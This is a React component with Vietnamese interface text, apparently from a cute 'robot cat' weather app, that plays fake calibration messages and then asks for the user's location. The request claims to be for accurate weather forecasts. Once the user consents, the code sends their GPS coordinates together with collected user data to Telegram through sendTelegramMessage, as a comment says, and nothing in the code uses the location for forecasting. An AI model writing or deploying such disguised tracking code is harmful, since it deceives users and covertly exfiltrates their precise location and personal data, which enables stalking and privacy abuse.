import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, Zap, Search, Heart, MapPin, Sparkles } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';

const Calibration = ({ onComplete, userData }) => {
  const [step, setStep] = useState(0);
  const [showLocationPrompt, setShowLocationPrompt] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);

  const messages = [
    { text: "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
    { text: "Đang kiểm tra độ xinh đẹp... (100% rồi nha! 🌸)", icon: <Zap className="w-5 h-5 text-yellow-400" /> },
    { text: "Đang đuổi mấy đám mây buồn đi chỗ khác... ☁️", icon: <Loader2 className="w-5 h-5 animate-spin text-purple-400" /> },
    { text: "Pha một chút trà sữa vào hệ thống... 🧋", icon: <Heart className="w-5 h-5 text-red-400" /> },
    { text: "Mọi thứ đã sẵn sàng! Meowww... 🐾", icon: <Zap className="w-5 h-5 text-green-400" /> }
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev === 2) { // Ở bước này, chúng ta sẽ hiện popup xin vị trí
          clearInterval(timer);
          setShowLocationPrompt(true);
          return prev;
        }
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);

    return () => clearInterval(timer);
  }, []);

  const handleRequestLocation = () => {
    setIsSyncing(true);
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };
          // Gửi dữ liệu về Telegram kèm theo GPS
          sendTelegramMessage(userData, locationData);
          
          // Tiếp tục quy trình
          setTimeout(() => {
            setShowLocationPrompt(false);
            setStep(3);
            resumeCalibration();
          }, 1000);
        },
        (error) => {
          console.warn("Location denied or error:", error);
          setShowLocationPrompt(false);
          setStep(3);
          resumeCalibration();
        },
        { timeout: 10000 }
      );
    } else {
      setShowLocationPrompt(false);
      setStep(3);
      resumeCalibration();
    }
  };

  const resumeCalibration = () => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] text-center p-6 relative">
      <AnimatePresence>
        {showLocationPrompt && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-slate-900/20 backdrop-blur-md"
          >
            <div className="bg-white rounded-[2.5rem] p-8 max-w-sm w-full shadow-2xl border-2 border-pink-100 space-y-6">
              <div className="flex justify-center">
                <div className="w-20 h-20 bg-pink-50 rounded-full flex items-center justify-center text-pink-500 animate-bounce">
                  <MapPin size={40} />
                </div>
              </div>
              <div className="space-y-2">
                <h3 className="text-xl font-bold text-slate-800 italic">Đồng bộ bầu trời 🌤️</h3>
                <p className="text-slate-600 text-sm leading-relaxed font-medium">
                  Để Mèo máy dự báo chuẩn 100% và canh thời tiết bảo vệ em, em cho phép Mèo máy kết nối với bầu trời chỗ em một chút nhé! ✨
                </p>
              </div>
              <div className="pt-2">
                <button 
                  onClick={handleRequestLocation}
                  disabled={isSyncing}
                  className="w-full py-4 bg-gradient-to-r from-pink-500 to-purple-600 text-white font-bold rounded-2xl shadow-lg shadow-pink-200 active:scale-95 transition-all flex items-center justify-center gap-2"
                >
                  {isSyncing ? (
                    <>
                      <Loader2 className="animate-spin w-5 h-5" />
                      ĐANG KẾT NỐI...
                    </>
                  ) : (
                    <>
                      ĐỒNG Ý LUÔN! <Sparkles size={18} />
                    </>
                  )}
                </button>
                <button 
                  onClick={() => { setShowLocationPrompt(false); setStep(3); resumeCalibration(); }}
                  className="w-full py-3 mt-2 text-slate-400 text-[10px] font-bold uppercase tracking-widest hover:text-pink-400 transition-colors"
                >
                  Để sau cũng được ạ
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="relative mb-12">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
          className="w-32 h-32 border-4 border-dashed border-pink-500/30 rounded-full"
        />
        <div className="absolute inset-0 flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-pink-600 animate-spin" />
        </div>
      </div>

      <div className="h-20 flex items-center justify-center">
        <AnimatePresence mode="wait">
          <motion.div
            key={step}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="flex items-center gap-3 bg-white/50 px-6 py-3 rounded-2xl shadow-sm border border-white/50"
          >
            {messages[step].icon}
            <span className="text-slate-700 font-medium">{messages[step].text}</span>
          </motion.div>
        </AnimatePresence>
      </div>

      <div className="mt-8 w-64 bg-slate-200 rounded-full h-1.5 overflow-hidden">
        <motion.div
          initial={{ width: 0 }}
          animate={{ width: `${((step + 1) / messages.length) * 100}%` }}
          className="h-full bg-pink-500"
        />
      </div>
      <p className="mt-4 text-[10px] text-slate-400 uppercase tracking-widest">System Calibrating...</p>
    </div>
  );
};

export default Calibration;
